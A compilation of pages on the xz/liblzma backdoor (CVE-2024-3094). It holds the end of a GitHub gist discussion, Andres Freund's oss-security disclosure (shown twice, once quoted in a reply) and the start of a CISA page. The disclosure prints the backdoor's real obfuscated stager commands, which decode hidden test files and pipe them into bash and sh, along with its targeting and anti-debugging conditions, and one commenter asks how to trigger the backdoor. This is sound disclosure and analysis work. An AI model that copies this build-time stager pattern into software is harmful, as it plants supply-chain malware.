* how the `Makefile` was tampered and the multiple `sed` commands and their arguments used to tamper it
* how the `liblzma_la-crc64-fast.o` object file was created by uncompressing the `good-large_compressed.lzma` file
* how the `liblzma_la-crc64-fast.o` object file was linked to overwrite the `liblzma_la-crc64_fast.o` file

You can refer to this blog post for more details <https://www.stepsecurity.io/blog/analysis-of-backdoored-xz-utils-build-process-with-harden-runner>.

Sorry, something went wrong.

[![@felipec](https://avatars.githubusercontent.com/u/8358?s=80&v=4)](/felipec)

Copy link

### **[felipec](/felipec)** commented [May 28, 2024](/thesamesam/223949d5a074ebc3dce9ee78baad9e27?permalink_comment_id=5071326#gistcomment-5071326)

[@varunsh-coder](https://github.com/varunsh-coder) the configure step doesn't use `build-to-host.m4`, I explained that in my blog post: [Simplifying the xz backdoor](https://felipec.wordpress.com/2024/04/18/simplifying-the-xz-backdoor/).

Sorry, something went wrong.

[![@leiless](https://avatars.githubusercontent.com/u/38041294?s=80&v=4)](/leiless)

Copy link

### **[leiless](/leiless)** commented [May 30, 2024](/thesamesam/223949d5a074ebc3dce9ee78baad9e27?permalink_comment_id=5073408#gistcomment-5073408) • edited Loading

Hi, all.

About the xz backdoor ssh:

I have the 5.6.1 version of liblzma (in a VM), and I want to do some experiments with it.

How could I use this xz backdoor to launch a malicious process (say `sleep infinity`)?

Sorry, something went wrong.

[![@eebssk1](https://avatars.githubusercontent.com/u/16506472?s=80&v=4)](/eebssk1)

Copy link

### **[eebssk1](/eebssk1)** commented [May 30, 2024](/thesamesam/223949d5a074ebc3dce9ee78baad9e27?permalink_comment_id=5073885#gistcomment-5073885)

> Hi, all.
>
> About the xz backdoor ssh: I have the 5.6.1 version of liblzma (in a VM), and I want to do some experiments with it.
>
> How could I use this xz backdoor to launch a malicious process (say `sleep infinity`)?

`Filippo Valsorda has shared [analysis](https://bsky.app/profile/filippo.abyssdomain.expert/post/3kowjkx2njy2b) indicating that the attacker must supply a key which is verified by the payload and then attacker input is passed to system(), giving remote code execution (RCE).`

Sorry, something went wrong.

[Sign up for free](/join?source=comment-gist)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgist.github.com%2Fthesamesam%2F223949d5a074ebc3dce9ee78baad9e27)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from www.openwall.com_63d120f9_20250111_034001.html ===


| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux   *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper   *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists   *for password cracking*](/wordlists/)+ [passwdqc   *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt   *KDF & password hashing*](/yescrypt/)+ [yespower   *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish   *password hashing*](/crypt/)+ [phpass   *ditto in PHP*](/phpass/)+ [tcb   *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd   *port scan detector*](/scanlogd/)+ [popa3d   *tiny POP3 daemon*](/popa3d/)+ [blists   *web interface to mailing lists*](/blists/)+ [msulogin   *single user mode login*](/msulogin/)+ [php\_mt\_seed   *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Follow @Openwall on Twitter for new release announcements and other news](https://twitter.com/openwall) | | --- | |
| --- | --- |

[[<prev]](4) [[next>]](6) [[<thread-prev]](4) [[thread-next>]](6) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-ID: <CAFRnB2UB4p9JHzq_PdibFUHvZdyjF-65Bj2kGuy5ZpG8JtOrNg@mail.gmail.com>
Date: Fri, 29 Mar 2024 12:17:31 -0400
From: Alex Gaynor <alex.gaynor@...il.com>
To: oss-security@...ts.openwall.com
Subject: Re: backdoor in upstream xz/liblzma leading to ssh
 server compromise

Hi Andres,

Thanks for writing this up. Just to make sure I understand the action
item here: folks who are building their own xz, should switch to a
release prior to 5.6.0, as those are the only ones known to be
unaffected?

Alex

On Fri, Mar 29, 2024 at 12:10 PM Andres Freund <andres@...razel.de> wrote:
>
> Hi,
>
> After observing a few odd symptoms around liblzma (part of the xz package) on
> Debian sid installations over the last weeks (logins with ssh taking a lot of
> CPU, valgrind errors) I figured out the answer:
>
> The upstream xz repository and the xz tarballs have been backdoored.
>
> At first I thought this was a compromise of debian's package, but it turns out
> to be upstream.
>
>
> == Compromised Release Tarball ==
>
> One portion of the backdoor is *solely in the distributed tarballs*. For
> easier reference, here's a link to debian's import of the tarball, but it is
> also present in the tarballs for 5.6.0 and 5.6.1:
>
> <https://salsa.debian.org/debian/xz-utils/-/blob/debian/unstable/m4/build-to-host.m4?ref_type=heads#L63>
>
> That line is *not* in the upstream source of build-to-host, nor is
> build-to-host used by xz in git.  However, it is present in the tarballs
> released upstream, except for the "source code" links, which I think github
> generates directly from the repository contents:
>
> <https://github.com/tukaani-project/xz/releases/tag/v5.6.0>
> <https://github.com/tukaani-project/xz/releases/tag/v5.6.1>
>
>
> This injects an obfuscated script to be executed at the end of configure. This
> script is fairly obfuscated and data from "test" .xz files in the repository.
>
>
> This script is executed and, if some preconditions match, modifies
> $builddir/src/liblzma/Makefile to contain
>
> am__test = bad-3-corrupt_lzma2.xz
> ...
> am__test_dir=$(top_srcdir)/tests/files/$(am__test)
> ...
> sed rpath $(am__test_dir) | $(am__dist_setup) >/dev/null 2>&1
>
>
> which ends up as
> ...; sed rpath ../../../tests/files/bad-3-corrupt_lzma2.xz | tr "        \-_" "         _\-" | xz -d | /bin/bash >/dev/null 2>&1; ...
>
> Leaving out the "| bash" that produces
>
> ####Hello####
> #��Z�.hj�
> eval `grep ^srcdir= config.status`
> if test -f ../../config.status;then
> eval `grep ^srcdir= ../../config.status`
> srcdir="../../$srcdir"
> fi
> export i="((head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +724)";(xz -dc $srcdir/tests/files/good-large_compressed.lzma|eval $i|tail -c +31265|tr "\5-\51\204-\377\52-\115\132-\203\0-\4\116-\131" "\0-\377")|xz -F raw --lzma1 -dc|/bin/sh
> ####World####
>
> After de-obfuscation this leads to the attached injected.txt.
>
>
> == Compromised Repository ==
>
> The files containing the bulk of the exploit are in an obfuscated form in
>   tests/files/bad-3-corrupt_lzma2.xz
>   tests/files/good-large_compressed.lzma
> committed upstream. They were initially added in
> <https://github.com/tukaani-project/xz/commit/cf44e4b7f5dfdbf8c78aef377c10f71e274f63c0>
>
> Note that the files were not even used for any "tests" in 5.6.0.
>
>
> Subsequently the injected code (more about that below) caused valgrind errors
> and crashes in some configurations, due the stack layout differing from what
> the backdoor was expecting.  These issues were attempted to be worked around
> in 5.6.1:
>
> <https://github.com/tukaani-project/xz/commit/e5faaebbcf02ea880cfc56edc702d4f7298788ad>
> <https://github.com/tukaani-project/xz/commit/72d2933bfae514e0dbb123488e9f1eb7cf64175f>
> <https://github.com/tukaani-project/xz/commit/82ecc538193b380a21622aea02b0ba078e7ade92>
>
> For which the exploit code was then adjusted:
> <https://github.com/tukaani-project/xz/commit/6e636819e8f070330d835fce46289a3ff72a7b89>
>
> Given the activity over several weeks, the committer is either directly
> involved or there was some quite severe compromise of their
> system. Unfortunately the latter looks like the less likely explanation, given
> they communicated on various lists about the "fixes" mentioned above.
>
>
> Florian Weimer first extracted the injected code in isolation, also attached,
> liblzma_la-crc64-fast.o, I had only looked at the whole binary. Thanks!
>
>
> == Affected Systems ==
>
> The attached de-obfuscated script is invoked first after configure, where it
> decides whether to modify the build process to inject the code.
>
> These conditions include targeting only x86-64 linux:
>     if ! (echo "$build" | grep -Eq "^x86_64" > /dev/null 2>&1) && (echo "$build" | grep -Eq "linux-gnu$" > /dev/null 2>&1);then
>
> Building with gcc and the gnu linker
>     if test "x$GCC" != 'xyes' > /dev/null 2>&1;then
>     exit 0
>     fi
>     if test "x$CC" != 'xgcc' > /dev/null 2>&1;then
>     exit 0
>     fi
>     LDv=$LD" -v"
>     if ! $LDv 2>&1 | grep -qs 'GNU ld' > /dev/null 2>&1;then
>     exit 0
>
> Running as part of a debian or RPM package build:
>     if test -f "$srcdir/debian/rules" || test "x$RPM_ARCH" = "xx86_64";then
>
> Particularly the latter is likely aimed at making it harder to reproduce the
> issue for investigators.
>
>
> Due to the working of the injected code (see below), it is likely the backdoor
> can only work on glibc based systems.
>
>
> Luckily xz 5.6.0 and 5.6.1 have not yet widely been integrated by linux
> distributions, and where they have, mostly in pre-release versions.
>
>
> == Observing Impact on openssh server ==
>
> With the backdoored liblzma installed, logins via ssh become a lot slower.
>
> time ssh nonexistant@...alhost
>
> before:
> nonexistant@...alhost: Permission denied (publickey).
>
> before:
> real    0m0.299s
> user    0m0.202s
> sys     0m0.006s
>
> after:
> nonexistant@...alhost: Permission denied (publickey).
>
> real    0m0.807s
> user    0m0.202s
> sys     0m0.006s
>
>
> openssh does not directly use liblzma. However debian and several other
> distributions patch openssh to support systemd notification, and libsystemd
> does depend on lzma.
>
>
> Initially starting sshd outside of systemd did not show the slowdown, despite
> the backdoor briefly getting invoked. This appears to be part of some
> countermeasures to make analysis harder.
>
> Observed requirements for the exploit:
> a) TERM environment variable is not set
> b) argv[0] needs to be /usr/sbin/sshd
> c) LD_DEBUG, LD_PROFILE are not set
> d) LANG needs to be set
> e) Some debugging environments, like rr, appear to be detected. Plain gdb
>    appears to be detected in some situations, but not others
>
> To reproduce outside of systemd, the server can be started with a clear
> environment, setting only the required variable:
>
> env -i LANG=en_US.UTF-8 /usr/sbin/sshd -D
>
>
> In fact, openssh does not need to be started as a server to observe the
> slowdown:
>
> slow:
> env -i LANG=C /usr/sbin/sshd -h
>
> (about 0.5s on my older system)
>
>
> fast:
> env -i LANG=C TERM=foo /usr/sbin/sshd -h
> env -i LANG=C LD_DEBUG=statistics /usr/sbin/sshd -h
> ...
>
> (about 0.01s on the same system)
>
>
> It's possible that argv[0] other /usr/sbin/sshd also would have effect - there
> are obviously lots of servers linking to libsystemd.
>
>
> == Analyzing the injected code ==
>
> I am *not* a security researcher, nor a reverse engineer.  There's lots of
> stuff I have not analyzed and most of what I observed is purely from
> observation rather than exhaustively analyzing the backdoor code.
>
> To analyze I primarily used "perf record -e intel_pt//ub" to observe where
> execution diverges between the backdoor being active and not. Then also gdb,
> setting breakpoints before the divergence.
>
>
> The backdoor initially intercepts execution by replacing the ifunc resolvers
> crc32_resolve(), crc64_resolve() with different code, which calls
> _get_cpuid(), injected into the code (which previously would just be static
> inline functions).  In xz 5.6.1 the backdoor was further obfuscated, removing
> symbol names.
>
> These functions get resolved during startup, because sshd is built with
> -Wl,-z,now, leading to all symbols being resolved early. If started with
> LD_BIND_NOT=1 the backdoor does not appear to work.
>
>
> Below crc32_resolve() _get_cpuid() does not do much, it just sees that a
> 'completed' variable is 0 and increments it, returning the normal cpuid result
> (via a new _cpuid()). It gets to be more interesting during crc64_resolve().
>
> In the second invocation crc64_resolve() appears to find various information,
> like data from the dynamic linker, program arguments and environment. Then it
> perform various environment checks, including those above. There are other
> checks I have not fully traced.
>
> If the above decides to continue, the code appears to be parsing the symbol
> tables in memory. This is the quite slow step that made me look into the issue.
>
>
> Notably liblzma's symbols are resolved before many of the other libraries,
> including the symbols in the main sshd binary.  This is important because
> symbols are resolved, the GOT gets remapped read-only thanks to -Wl,-z,relro.
>
>
> To be able to resolve symbols in libraries that have not yet loaded, the
> backdoor installs an audit hook into the dynamic linker, which can be observed
> with gdb using
>   watch _rtld_global_ro._dl_naudit
> It looks like the audit hook is only installed for the main binary.
>
> That hook gets called, from _dl_audit_symbind, for numerous symbols in the
> main binary. It appears to wait for "RSA_public_decrypt@....plt" to be
> resolved.  When called for that symbol, the backdoor changes the value of
> RSA_public_decrypt@....plt to point to its own code.  It does not do this via
> the audit hook mechanism, but outside of it.
>
> For reasons I do not yet understand, it does change sym.st_value *and* the
> return value of from the audit hook to a different value, which leads
> _dl_audit_symbind() to do nothing - why change anything at all then?
>
> After that the audit hook is uninstalled again.
>
> It is possible to change the got.plt contents at this stage because it has not
> (and can't yet) been remapped to be read-only.
>
>
> I suspect there might be further changes performed at this stage.
>
>
> == Impact on sshd ==
>
> The prior section explains that RSA_public_decrypt@....plt was redirected to
> point into the backdoor code. The trace I was analyzing indeed shows that
> during a pubkey login the exploit code is invoked:
>
>             sshd 1736357 [010] 714318.734008:          1  branches:uH:      5555555ded8c ssh_rsa_verify+0x49c (/usr/sbin/sshd) =>     5555555612d0 RSA_public_decrypt@...+0x0 (/usr/sbin/sshd)
>
> The backdoor then calls back into libcrypto, presumably to perform normal authentication
>
>             sshd 1736357 [010] 714318.734009:          1  branches:uH:      7ffff7c137cd [unknown] (/usr/lib/x86_64-linux-gnu/liblzma.so.5.6.0) =>     7ffff792a2b0 RSA_get0_key+0x0 (/usr/lib/x86_64-linux-gnu/libcrypto.so.3)
>
>
> I have not yet analyzed precisely what is being checked for in the injected
> code, to allow unauthorized access. Since this is running in a
> pre-authentication context, it seems likely to allow some form of access or
> other form of remote code execution.
>
> I'd upgrade any potentially vulnerable system ASAP.
>
>
> == Bug reports ==
>
> Given the apparent upstream involvement I have not reported an upstream
> bug. As I initially thought it was a debian specific issue, I sent a more
> preliminary report to security@...ian.org.  Subsequently I reported the issue
> to distros@. CISA was notified by a distribution.
>
> Red Hat assigned this issue CVE-2024-3094.
>
>
> == Detecting if installation is vulnerable ==
>
> Vegard Nossum wrote a script to detect if it's likely that the ssh binary on a
> system is vulnerable, attached here. Thanks!
>
>
> Greetings,
>
> Andres Freund

--
All that is necessary for evil to succeed is for good people to do nothing.

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).



=== Content from www.openwall.com_39ddd182_20250111_034042.html ===


| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux   *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper   *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists   *for password cracking*](/wordlists/)+ [passwdqc   *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt   *KDF & password hashing*](/yescrypt/)+ [yespower   *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish   *password hashing*](/crypt/)+ [phpass   *ditto in PHP*](/phpass/)+ [tcb   *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd   *port scan detector*](/scanlogd/)+ [popa3d   *tiny POP3 daemon*](/popa3d/)+ [blists   *web interface to mailing lists*](/blists/)+ [msulogin   *single user mode login*](/msulogin/)+ [php\_mt\_seed   *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Follow @Openwall on Twitter for new release announcements and other news](https://twitter.com/openwall) | | --- | |
| --- | --- |

[[<prev]](3) [[next>]](5) [[thread-next>]](5) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-ID: <20240329155126.kjjfduxw2yrlxgzm@awork3.anarazel.de>
Date: Fri, 29 Mar 2024 08:51:26 -0700
From: Andres Freund <andres@...razel.de>
To: oss-security@...ts.openwall.com
Subject: backdoor in upstream xz/liblzma leading to ssh server compromise

Hi,

After observing a few odd symptoms around liblzma (part of the xz package) on
Debian sid installations over the last weeks (logins with ssh taking a lot of
CPU, valgrind errors) I figured out the answer:

The upstream xz repository and the xz tarballs have been backdoored.

At first I thought this was a compromise of debian's package, but it turns out
to be upstream.

== Compromised Release Tarball ==

One portion of the backdoor is *solely in the distributed tarballs*. For
easier reference, here's a link to debian's import of the tarball, but it is
also present in the tarballs for 5.6.0 and 5.6.1:

<https://salsa.debian.org/debian/xz-utils/-/blob/debian/unstable/m4/build-to-host.m4?ref_type=heads#L63>

That line is *not* in the upstream source of build-to-host, nor is
build-to-host used by xz in git.  However, it is present in the tarballs
released upstream, except for the "source code" links, which I think github
generates directly from the repository contents:

<https://github.com/tukaani-project/xz/releases/tag/v5.6.0>
<https://github.com/tukaani-project/xz/releases/tag/v5.6.1>

This injects an obfuscated script to be executed at the end of configure. This
script is fairly obfuscated and data from "test" .xz files in the repository.

This script is executed and, if some preconditions match, modifies
$builddir/src/liblzma/Makefile to contain

am__test = bad-3-corrupt_lzma2.xz
...
am__test_dir=$(top_srcdir)/tests/files/$(am__test)
...
sed rpath $(am__test_dir) | $(am__dist_setup) >/dev/null 2>&1

which ends up as
...; sed rpath ../../../tests/files/bad-3-corrupt_lzma2.xz | tr "	 \-_" " 	_\-" | xz -d | /bin/bash >/dev/null 2>&1; ...

Leaving out the "| bash" that produces

####Hello####
#��Z�.hj�
eval `grep ^srcdir= config.status`
if test -f ../../config.status;then
eval `grep ^srcdir= ../../config.status`
srcdir="../../$srcdir"
fi
export i="((head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +724)";(xz -dc $srcdir/tests/files/good-large_compressed.lzma|eval $i|tail -c +31265|tr "\5-\51\204-\377\52-\115\132-\203\0-\4\116-\131" "\0-\377")|xz -F raw --lzma1 -dc|/bin/sh
####World####

After de-obfuscation this leads to the attached injected.txt.

== Compromised Repository ==

The files containing the bulk of the exploit are in an obfuscated form in
  tests/files/bad-3-corrupt_lzma2.xz
  tests/files/good-large_compressed.lzma
committed upstream. They were initially added in
<https://github.com/tukaani-project/xz/commit/cf44e4b7f5dfdbf8c78aef377c10f71e274f63c0>

Note that the files were not even used for any "tests" in 5.6.0.

Subsequently the injected code (more about that below) caused valgrind errors
and crashes in some configurations, due the stack layout differing from what
the backdoor was expecting.  These issues were attempted to be worked around
in 5.6.1:

<https://github.com/tukaani-project/xz/commit/e5faaebbcf02ea880cfc56edc702d4f7298788ad>
<https://github.com/tukaani-project/xz/commit/72d2933bfae514e0dbb123488e9f1eb7cf64175f>
<https://github.com/tukaani-project/xz/commit/82ecc538193b380a21622aea02b0ba078e7ade92>

For which the exploit code was then adjusted:
<https://github.com/tukaani-project/xz/commit/6e636819e8f070330d835fce46289a3ff72a7b89>

Given the activity over several weeks, the committer is either directly
involved or there was some quite severe compromise of their
system. Unfortunately the latter looks like the less likely explanation, given
they communicated on various lists about the "fixes" mentioned above.

Florian Weimer first extracted the injected code in isolation, also attached,
liblzma_la-crc64-fast.o, I had only looked at the whole binary. Thanks!

== Affected Systems ==

The attached de-obfuscated script is invoked first after configure, where it
decides whether to modify the build process to inject the code.

These conditions include targeting only x86-64 linux:
    if ! (echo "$build" | grep -Eq "^x86_64" > /dev/null 2>&1) && (echo "$build" | grep -Eq "linux-gnu$" > /dev/null 2>&1);then

Building with gcc and the gnu linker
    if test "x$GCC" != 'xyes' > /dev/null 2>&1;then
    exit 0
    fi
    if test "x$CC" != 'xgcc' > /dev/null 2>&1;then
    exit 0
    fi
    LDv=$LD" -v"
    if ! $LDv 2>&1 | grep -qs 'GNU ld' > /dev/null 2>&1;then
    exit 0

Running as part of a debian or RPM package build:
    if test -f "$srcdir/debian/rules" || test "x$RPM_ARCH" = "xx86_64";then

Particularly the latter is likely aimed at making it harder to reproduce the
issue for investigators.

Due to the working of the injected code (see below), it is likely the backdoor
can only work on glibc based systems.

Luckily xz 5.6.0 and 5.6.1 have not yet widely been integrated by linux
distributions, and where they have, mostly in pre-release versions.

== Observing Impact on openssh server ==

With the backdoored liblzma installed, logins via ssh become a lot slower.

time ssh nonexistant@...alhost

before:
nonexistant@...alhost: Permission denied (publickey).

before:
real	0m0.299s
user	0m0.202s
sys	0m0.006s

after:
nonexistant@...alhost: Permission denied (publickey).

real	0m0.807s
user	0m0.202s
sys	0m0.006s

openssh does not directly use liblzma. However debian and several other
distributions patch openssh to support systemd notification, and libsystemd
does depend on lzma.

Initially starting sshd outside of systemd did not show the slowdown, despite
the backdoor briefly getting invoked. This appears to be part of some
countermeasures to make analysis harder.

Observed requirements for the exploit:
a) TERM environment variable is not set
b) argv[0] needs to be /usr/sbin/sshd
c) LD_DEBUG, LD_PROFILE are not set
d) LANG needs to be set
e) Some debugging environments, like rr, appear to be detected. Plain gdb
   appears to be detected in some situations, but not others

To reproduce outside of systemd, the server can be started with a clear
environment, setting only the required variable:

env -i LANG=en_US.UTF-8 /usr/sbin/sshd -D

In fact, openssh does not need to be started as a server to observe the
slowdown:

slow:
env -i LANG=C /usr/sbin/sshd -h

(about 0.5s on my older system)

fast:
env -i LANG=C TERM=foo /usr/sbin/sshd -h
env -i LANG=C LD_DEBUG=statistics /usr/sbin/sshd -h
...

(about 0.01s on the same system)

It's possible that argv[0] other /usr/sbin/sshd also would have effect - there
are obviously lots of servers linking to libsystemd.

== Analyzing the injected code ==

I am *not* a security researcher, nor a reverse engineer.  There's lots of
stuff I have not analyzed and most of what I observed is purely from
observation rather than exhaustively analyzing the backdoor code.

To analyze I primarily used "perf record -e intel_pt//ub" to observe where
execution diverges between the backdoor being active and not. Then also gdb,
setting breakpoints before the divergence.

The backdoor initially intercepts execution by replacing the ifunc resolvers
crc32_resolve(), crc64_resolve() with different code, which calls
_get_cpuid(), injected into the code (which previously would just be static
inline functions).  In xz 5.6.1 the backdoor was further obfuscated, removing
symbol names.

These functions get resolved during startup, because sshd is built with
-Wl,-z,now, leading to all symbols being resolved early. If started with
LD_BIND_NOT=1 the backdoor does not appear to work.

Below crc32_resolve() _get_cpuid() does not do much, it just sees that a
'completed' variable is 0 and increments it, returning the normal cpuid result
(via a new _cpuid()). It gets to be more interesting during crc64_resolve().

In the second invocation crc64_resolve() appears to find various information,
like data from the dynamic linker, program arguments and environment. Then it
perform various environment checks, including those above. There are other
checks I have not fully traced.

If the above decides to continue, the code appears to be parsing the symbol
tables in memory. This is the quite slow step that made me look into the issue.

Notably liblzma's symbols are resolved before many of the other libraries,
including the symbols in the main sshd binary.  This is important because
symbols are resolved, the GOT gets remapped read-only thanks to -Wl,-z,relro.

To be able to resolve symbols in libraries that have not yet loaded, the
backdoor installs an audit hook into the dynamic linker, which can be observed
with gdb using
  watch _rtld_global_ro._dl_naudit
It looks like the audit hook is only installed for the main binary.

That hook gets called, from _dl_audit_symbind, for numerous symbols in the
main binary. It appears to wait for "RSA_public_decrypt@....plt" to be
resolved.  When called for that symbol, the backdoor changes the value of
RSA_public_decrypt@....plt to point to its own code.  It does not do this via
the audit hook mechanism, but outside of it.

For reasons I do not yet understand, it does change sym.st_value *and* the
return value of from the audit hook to a different value, which leads
_dl_audit_symbind() to do nothing - why change anything at all then?

After that the audit hook is uninstalled again.

It is possible to change the got.plt contents at this stage because it has not
(and can't yet) been remapped to be read-only.

I suspect there might be further changes performed at this stage.

== Impact on sshd ==

The prior section explains that RSA_public_decrypt@....plt was redirected to
point into the backdoor code. The trace I was analyzing indeed shows that
during a pubkey login the exploit code is invoked:

            sshd 1736357 [010] 714318.734008:          1  branches:uH:      5555555ded8c ssh_rsa_verify+0x49c (/usr/sbin/sshd) =>     5555555612d0 RSA_public_decrypt@...+0x0 (/usr/sbin/sshd)

The backdoor then calls back into libcrypto, presumably to perform normal authentication

            sshd 1736357 [010] 714318.734009:          1  branches:uH:      7ffff7c137cd [unknown] (/usr/lib/x86_64-linux-gnu/liblzma.so.5.6.0) =>     7ffff792a2b0 RSA_get0_key+0x0 (/usr/lib/x86_64-linux-gnu/libcrypto.so.3)

I have not yet analyzed precisely what is being checked for in the injected
code, to allow unauthorized access. Since this is running in a
pre-authentication context, it seems likely to allow some form of access or
other form of remote code execution.

I'd upgrade any potentially vulnerable system ASAP.

== Bug reports ==

Given the apparent upstream involvement I have not reported an upstream
bug. As I initially thought it was a debian specific issue, I sent a more
preliminary report to security@...ian.org.  Subsequently I reported the issue
to distros@. CISA was notified by a distribution.

Red Hat assigned this issue CVE-2024-3094.

== Detecting if installation is vulnerable ==

Vegard Nossum wrote a script to detect if it's likely that the ssh binary on a
system is vulnerable, attached here. Thanks!

Greetings,

Andres Freund

View attachment "[injected.txt](4/1)" of type "text/plain" (8236 bytes)

Download attachment "[liblzma_la-crc64-fast.o.gz](4/2)" of type "application/gzip" (36487 bytes)

Download attachment "[detect.sh](4/3)" of type "application/x-sh" (426 bytes)

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).



=== Content from www.cisa.gov_8d4528e7_20250111_034040.html ===

[Skip to main content](#main)

![U.S. flag](/profiles/cisad8_gov/themes/custom/gesso/dist/images/us_flag_small.png)

An official website of the United States government

Here’s how you know

Here’s how you know

![Dot gov](/profiles/cisad8_gov/themes/custom/gesso/dist/images/icon-dot-gov.svg)

**Official websites use .gov**

 A **.gov** website belongs to an official government organization in the United States.

![HTTPS](/profiles/cisad8_gov/themes/custom/gesso/dist/images/icon-https.svg)

**Secure .gov websites use HTTPS**

 A **lock** (LockA locked padlock) or **https://** means you’ve safely connected to the .gov website. Share sensitive information only on official, secure websites.

[Free Cyber Services](/resources-tools/resources/free-cybersecurity-services-and-tools "Free Cyber Services")[Election Threat Updates](/topics/election-security/election-threat-updates)[#protect2024](/protect2024)[Secure Our World](/node/18883)[Shields Up](/node/8056)[Report A Cyber Issue](/report)

[![Cybersecurity & Infrastructure Security Agency logo America’s Cyber Security Defense Agency National Coordinator For Critical Infrastructure Security and Resilience](/sites/default/files/images/SVG/header_logo_tagline_update.svg)](/)

[![CISA Logo](/sites/default/files/images/SVG/mobile_logo_wordmark.svg)](/)

Search

Menu

![America's Cyber Defense Agency](/sites/default/files/images/SVG/header_tagline_mobile_update.svg)

Close

* Topics

  [Topics](/topics)

  [Cybersecurity Best Practices](/topics/cybersecurity-best-practices)

  [Cyber Threats and Advisories](/topics/cyber-threats-and-advisories)

  [Critical Infrastructure Security and Resilience](/topics/critical-infrastructure-security-and-resilience)

  [Election Security](/topics/election-security)

  [Emergency Communications](/topics/emergency-communications)

  [Industrial Control Systems](/topics/industrial-control-systems)

  [Information and Communications Technology Supply Chain Security](/topics/information-communications-technology-supply-chain-security)

  [Partnerships and Collaboration](/topics/partnerships-and-collaboration)

  [Physical Security](/topics/physical-security)

  [Risk Management](/topics/risk-management)

   [How can we help?](/audiences)
